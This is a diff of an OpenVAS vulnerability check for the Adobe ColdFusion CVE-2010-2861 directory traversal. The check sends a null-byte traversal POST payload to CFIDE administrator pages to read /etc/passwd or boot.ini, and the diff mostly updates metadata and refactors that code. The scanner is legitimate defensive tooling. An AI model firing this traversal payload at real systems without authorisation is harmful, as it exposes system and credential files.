@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_coldfusion_42342.nasl 14326 2019-03-19 13:40:32Z jschulte $
 #
 # Adobe ColdFusion CVE-2010-2861 Directory Traversal Vulnerability
 #
@@ -27,8 +26,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.100772");
-  script_version("$Revision: 14326 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
+  script_version("2019-05-13T14:05:09+0000");
+  script_tag(name:"last_modification", value:"2019-05-13 14:05:09 +0000 (Mon, 13 May 2019)");
   script_tag(name:"creation_date", value:"2010-09-02 16:10:00 +0200 (Thu, 02 Sep 2010)");
   script_bugtraq_id(42342);
   script_cve_id("CVE-2010-2861");
@@ -48,17 +47,22 @@ if (description)
   script_category(ACT_ATTACK);
   script_family("Web application abuses");
   script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
-  script_dependencies("os_detection.nasl", "gb_coldfusion_detect.nasl");
+  script_dependencies("gb_coldfusion_detect.nasl", "os_detection.nasl");
   script_require_ports("Services/www", 80);
+  script_mandatory_keys("coldfusion/installed");
+
   script_tag(name:"solution_type", value:"VendorFix");
+
   script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");
+
   script_tag(name:"summary", value:"Adobe ColdFusion is prone to a directory-traversal vulnerability
-because it fails to sufficiently sanitize user-supplied input.
+  because it fails to sufficiently sanitize user-supplied input.");
 
-Exploiting this issue may allow an attacker to obtain sensitive
-information that could aid in further attacks.
+  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
+  information that could aid in further attacks.");
 
-Adobe ColdFusion 9.0.1 and prior are vulnerable.");
+  script_tag(name:"affected", value:"Adobe ColdFusion 9.0.1 and prior are vulnerable.");
+
   exit(0);
 }
 
@@ -66,45 +70,40 @@ include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
 include("version_func.inc");
+include("misc_func.inc");
 
 port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
 
-if(!get_kb_item(string("coldfusion/",port,"/installed")))exit(0);
+if(!get_kb_item(string("coldfusion/",port,"/installed")))
+  exit(0);
 
-res = host_runs("windows");
-if (res == "yes") {
-    files = make_array("\[boot loader\]","boot.ini");
-} else if (res == "no") {
-    files = make_array("root:.*:0:[01]:","etc/passwd");
-} else {
-  # "unknown"
-  files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
-}
+files = traversal_files();
 
 urls[i++] = "/CFIDE/administrator/enter.cfm";
 urls[i++] = "/CFIDE/wizards/common/_logintowizard.cfm";
 urls[i++] = "/CFIDE/administrator/archives/index.cfm";
 urls[i++] = "/CFIDE/administrator/entman/index.cfm";
 
-foreach url (urls) {
-  foreach file (keys(files)) {
+host = http_host_name(port:port);
 
-    postdata = string("locale=%00../../../../../../../../../../../",files[file],"%00a");
+foreach url (urls) {
+  foreach pattern( keys( files ) ) {
+
+    file = files[pattern];
+    postdata = string("locale=%00../../../../../../../../../../../",file,"%00a");
 
     req = string(
              "POST ", url, " HTTP/1.1\r\n",
-             "Host: ", get_host_name(), "\r\n",
+             "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen(postdata), "\r\n",
              "\r\n",
-             postdata
-        );
-
+             postdata );
     res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
 
-    if(egrep(pattern: file, string: res, icase: TRUE)) {
-      security_message(port:port);
+    if(egrep(pattern: pattern, string: res, icase: TRUE)) {
+      report = report_vuln_url(port:port, url:url);
+      security_message(port:port, data:report);
       exit(0);
     }
   }
